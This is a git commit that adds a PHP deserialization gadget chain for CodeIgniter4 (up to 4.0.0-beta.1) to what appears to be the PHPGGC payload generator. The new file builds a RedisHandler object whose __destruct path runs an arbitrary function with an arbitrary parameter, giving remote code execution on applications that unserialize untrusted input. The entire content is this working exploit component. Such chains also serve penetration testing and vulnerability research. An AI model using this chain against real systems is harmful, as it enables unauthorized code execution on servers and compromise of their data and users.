fc751e7edecce5e9a45b78e5a33e8169c8e516c6
Edgar Boda-Majer <edgar.boda@gmail.com>
2019-03-25 17:31:51 +0100

    add CodeIginiter4 chain

---
+++ gadgetchains/CodeIgniter4/RCE/1/chain.php
@@ -0,0 +1,18 @@
+<?php
+
+namespace GadgetChain\CodeIgniter4;
+
+class RCE1 extends \PHPGGC\GadgetChain\RCE
+{
+    public static $version = '? <= 4.0.0-beta.1';
+    public static $vector = '__destruct';
+    public static $author = 'eboda';
+
+    public function generate(array $parameters)
+    {
+        $function = $parameters['function'];
+        $parameter = $parameters['parameter'];
+
+        return new \CodeIgniter\Cache\Handlers\RedisHandler($function, $parameter);
+    }
+}
